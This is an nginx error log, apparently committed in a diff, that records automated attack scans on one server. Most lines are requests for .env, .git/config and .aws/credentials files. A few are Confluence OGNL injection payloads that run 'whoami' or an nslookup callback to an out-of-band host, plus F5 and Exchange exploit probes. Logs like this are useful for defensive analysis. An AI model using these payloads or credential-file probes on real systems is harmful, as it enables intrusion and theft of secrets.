+2025/03/16 11:46:05 [error] 276#276: *41413 open() "/var/www/html/webtools/control/main/ProgramExport" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /webtools/control/main/ProgramExport HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 274#274: *42905 open() "/var/www/html/template/custom/content-editor" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /template/custom/content-editor HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 274#274: *42907 open() "/var/www/html/confluence/pages/createpage-entervariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /confluence/pages/createpage-entervariables.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 274#274: *42906 open() "/var/www/html/pages/doenterpagevariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /pages/doenterpagevariables.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 277#277: *42908 open() "/var/www/html/pages/templates2/viewpagetemplate.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /pages/templates2/viewpagetemplate.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 276#276: *42909 open() "/var/www/html/confluence/pages/createpage-entervariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /confluence/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 276#276: *42910 open() "/var/www/html/pages/createpage-entervariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /pages/createpage-entervariables.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 275#275: *42911 open() "/var/www/html/wiki/pages/createpage-entervariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /wiki/pages/createpage-entervariables.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 276#276: *42915 open() "/var/www/html/pages/createpage-entervariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 276#276: *42916 open() "/var/www/html/users/user-dark-features" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /users/user-dark-features HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 274#274: *42913 open() "/var/www/html/templates/editor-preload-container" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /templates/editor-preload-container HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 274#274: *42914 open() "/var/www/html/wiki/pages/createpage-entervariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /wiki/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 274#274: *42912 open() "/var/www/html/pages/createpage.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /pages/createpage.action?spaceKey=myproj HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:46:13 [error] 277#277: *42917 open() "/var/www/html/pages/createpage-entervariables.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /pages/createpage-entervariables.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:47:22 [error] 277#277: *42956 open() "/var/www/html/pfblockerng/www/index.php" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /pfblockerng/www/index.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:47:30 [error] 277#277: *42957 open() "/var/www/html/mgmt/tm/util/bash" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /mgmt/tm/util/bash HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:47:30 [error] 277#277: *42958 open() "/var/www/html/autodiscover/autodiscover.json" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:47:32 [error] 277#277: *42961 "/var/www/html/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/index.html" is not found (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:47:45 [error] 277#277: *42971 open() "/var/www/html/mgmt/tm/util/bash" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /mgmt/tm/util/bash HTTP/1.1", host: "localhost"
+2025/03/16 11:47:45 [error] 277#277: *42972 open() "/var/www/html/autodiscover/autodiscover.json" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:47:47 [error] 277#277: *42973 "/var/www/html/${@java.lang.Runtime@getRuntime().exec("nslookup cvban2h9gkqfgfs6tcj041h31j6qswcfz.oast.me")}/index.html" is not found (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cvban2h9gkqfgfs6tcj041h31j6qswcfz.oast.me%22%29%7D/ HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:53:13 [error] 277#277: *43031 open() "/var/www/html/setup/setupadministrator-start.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /setup/setupadministrator-start.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:53:27 [error] 277#277: *43036 open() "/var/www/html/server-info.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache2uOa2NxUZBIcpfKBQowlmumIE49 HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:53:41 [error] 276#276: *43040 open() "/var/www/html/setup/setupadministrator-start.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /setup/setupadministrator-start.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:53:56 [error] 276#276: *43047 open() "/var/www/html/setup/setupadministrator.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /setup/setupadministrator.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:54:10 [error] 276#276: *43050 open() "/var/www/html/dologin.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "POST /dologin.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:54:24 [error] 276#276: *43057 open() "/var/www/html/welcome.action" failed (2: No such file or directory), client: 77.90.153.48, server: localhost-nginx-proxy-manager, request: "GET /welcome.action HTTP/1.1", host: "207.180.195.219"
+2025/03/16 12:18:35 [error] 276#276: *43295 open() "/var/www/html/login.rsp" failed (2: No such file or directory), client: 196.251.85.238, server: localhost-nginx-proxy-manager, request: "GET /login.rsp HTTP/1.1", host: "207.180.195.219:80"
+2025/03/16 13:39:50 [error] 275#275: *43985 open() "/var/www/html/.env.ci" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.ci HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 275#275: *43986 open() "/var/www/html/.env.uat" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.uat HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 275#275: *43987 open() "/var/www/html/.env.template" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.template HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 275#275: *43988 open() "/var/www/html/dev/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /dev/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 275#275: *43989 open() "/var/www/html/server/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /server/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 275#275: *43990 open() "/var/www/html/.env.stage" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.stage HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 274#274: *43991 open() "/var/www/html/settings/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /settings/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 274#274: *43992 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 274#274: *43993 open() "/var/www/html/project/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /project/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 274#274: *43994 open() "/var/www/html/.aws/credentials" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.aws/credentials HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 274#274: *43995 open() "/var/www/html/.env.config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 274#274: *43996 open() "/var/www/html/.env.dev" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.dev HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:50 [error] 274#274: *43997 open() "/var/www/html/.env.save" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.save HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *43998 open() "/var/www/html/api/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /api/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *43999 open() "/var/www/html/configuration/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /configuration/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *44000 open() "/var/www/html/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *44001 open() "/var/www/html/.env.development.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.development.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *44002 open() "/var/www/html/build/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /build/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *44003 open() "/var/www/html/core/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /core/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *44004 open() "/var/www/html/.env.preprod" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.preprod HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *44005 open() "/var/www/html/.env.prod" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.prod HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 274#274: *44006 open() "/var/www/html/.env.sandbox" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.sandbox HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44007 open() "/var/www/html/files/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /files/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44008 open() "/var/www/html/.env.test" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.test HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44009 open() "/var/www/html/prod/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /prod/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44010 open() "/var/www/html/.env.testing" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.testing HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44011 open() "/var/www/html/backup/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /backup/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44012 open() "/var/www/html/public/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /public/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44013 open() "/var/www/html/docker-compose.prod.yml" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /docker-compose.prod.yml HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44014 open() "/var/www/html/.env.default" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.default HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44015 open() "/var/www/html/.env.staging.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.staging.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44016 open() "/var/www/html/config/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /config/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44017 open() "/var/www/html/media/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /media/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44018 open() "/var/www/html/.env.dist" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.dist HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44019 open() "/var/www/html/.env.production.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.production.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44020 open() "/var/www/html/www/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /www/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44021 open() "/var/www/html/app/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /app/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 277#277: *44022 open() "/var/www/html/media../.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /media../.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 276#276: *44023 open() "/var/www/html/static../.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /static../.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 276#276: *44024 open() "/var/www/html/admin/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /admin/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 276#276: *44025 open() "/var/www/html/.env.bak" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.bak HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 276#276: *44026 open() "/var/www/html/.env.production" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.production HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:51 [error] 276#276: *44027 open() "/var/www/html/config/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /config/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44028 open() "/var/www/html/config.json" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /config.json HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44029 open() "/var/www/html/.env_sample" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env_sample HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44030 open() "/var/www/html/assets../.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /assets../.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44031 open() "/var/www/html/src/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /src/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44032 open() "/var/www/html/.env.backup" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.backup HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44033 open() "/var/www/html/.env.dev.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.dev.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44034 open() "/var/www/html/api/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /api/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44035 open() "/var/www/html/.env.live" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.live HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44036 open() "/var/www/html/data/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /data/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44037 open() "/var/www/html/.env.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 276#276: *44038 open() "/var/www/html/.env.secret" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.secret HTTP/1.1", host: "207.180.195.219"
+2025/03/16 13:39:52 [error] 275#275: *44039 open() "/var/www/html/cms/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /cms/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:20:35 [error] 275#275: *45352 open() "/var/www/html/form.html" failed (2: No such file or directory), client: 147.182.155.145, server: localhost-nginx-proxy-manager, request: "GET /form.html HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:20:35 [error] 275#275: *45353 open() "/var/www/html/upl.php" failed (2: No such file or directory), client: 147.182.155.145, server: localhost-nginx-proxy-manager, request: "GET /upl.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:20:35 [error] 275#275: *45354 open() "/var/www/html/t4" failed (2: No such file or directory), client: 147.182.155.145, server: localhost-nginx-proxy-manager, request: "GET /t4 HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:20:36 [error] 275#275: *45355 "/var/www/html/geoip/index.html" is not found (2: No such file or directory), client: 147.182.155.145, server: localhost-nginx-proxy-manager, request: "GET /geoip/ HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:20:37 [error] 276#276: *46843 open() "/var/www/html/1.php" failed (2: No such file or directory), client: 147.182.155.145, server: localhost-nginx-proxy-manager, request: "GET /1.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:20:37 [error] 276#276: *46844 open() "/var/www/html/systembc/password.php" failed (2: No such file or directory), client: 147.182.155.145, server: localhost-nginx-proxy-manager, request: "GET /systembc/password.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:20:38 [error] 276#276: *46845 open() "/var/www/html/password.php" failed (2: No such file or directory), client: 147.182.155.145, server: localhost-nginx-proxy-manager, request: "GET /password.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 14:31:57 [error] 276#276: *46943 open() "/var/www/html/.env" failed (2: No such file or directory), client: 78.153.140.147, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 16:09:20 [error] 286#286: *47632 open() "/var/www/html/version" failed (2: No such file or directory), client: 112.74.37.75, server: localhost-nginx-proxy-manager, request: "GET /version HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49884 open() "/var/www/html/.git/HEAD" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.git/HEAD HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/tests/test-become/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /tests/test-become/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/_static/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /_static/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.c9/metadata/environment/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.c9/metadata/environment/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.docker/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.docker/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.docker/laravel/app/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.docker/laravel/app/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.backup" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.backup HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.dev" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.dev HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.development.local" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.development.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.docker.dev" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.docker.dev HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.example" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.example HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.local" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.php" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.prod" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.prod HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.production.local" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.production.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.sample.php" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.sample.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.save" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.save HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.stage" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.stage HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.test" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.test HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env.test.local" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env.test.local HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.env~" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.env~ HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.gitlab-ci/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.gitlab-ci/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/.vscode/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /.vscode/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/3-sequelize/final/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /3-sequelize/final/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/31_structure_tests/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /31_structure_tests/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/acme_challenges/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /acme_challenges/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/acme-challenge/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /acme-challenge/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/acme/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /acme/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/actions-server/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /actions-server/.env HTTP/1.1", host: "207.180.195.219"
